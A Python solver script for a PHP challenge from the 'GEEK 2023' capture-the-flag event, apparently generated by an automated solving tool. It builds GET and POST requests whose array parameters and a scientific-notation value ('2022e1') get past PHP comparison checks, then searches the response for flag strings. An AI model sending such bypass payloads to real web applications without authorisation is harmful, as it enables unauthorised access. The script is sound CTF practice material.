import urllib.request, urllib.parse, re, html as _html

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

# Build exactly what _execute_php_bypass would send
get_params = {
    'syc': 'Welcome to GEEK 2023!\n',
    'lover': '2022e1',
}
post_parts = [
    ('qw[]', 'a'),
    ('qw[]', 'a'),  # from __ARRAY_PARAMS__ (duplicate from __ANY__)
    ('yxx[]', 'b'),
    ('SYC_GEEK[2023]', 'Happy to see you!'),
]

# URL encode
get_str = '&'.join(f'{urllib.parse.quote(k, safe="")}={urllib.parse.quote(v, safe="")}'
                   for k, v in get_params.items())
post_str = '&'.join(f'{urllib.parse.quote(k, safe="")}={urllib.parse.quote(v, safe="")}'
                    for k, v in post_parts)

full_url = url + '?' + get_str
print(f"GET: {full_url[:100]}...")
print(f"POST: {post_str[:120]}...")

req = urllib.request.Request(full_url, data=post_str.encode('utf-8'), headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp = urllib.request.urlopen(req, timeout=10)
body = resp.read().decode('utf-8', errors='replace')
clean = _html.unescape(re.sub(r'<[^>]+>', '', body))
idx = clean.find('?>')
text = clean[idx+2:].strip() if idx > 0 else clean[:200]

# Save for inspection
with open('bypass_response.txt', 'w', encoding='utf-8') as f:
    f.write(clean)
    
print(f"Response ({len(text)} chars): {repr(text[:200])}")

# Check for flags
for pat in ['flag{', 'CTF{', 'Geesec{', 'GEEK{', 'ISCC{']:
    if pat in text:
        i = text.find(pat); e = text.find('}', i)
        if e > i:
            print(f"FLAG: {text[i:e+1]}")
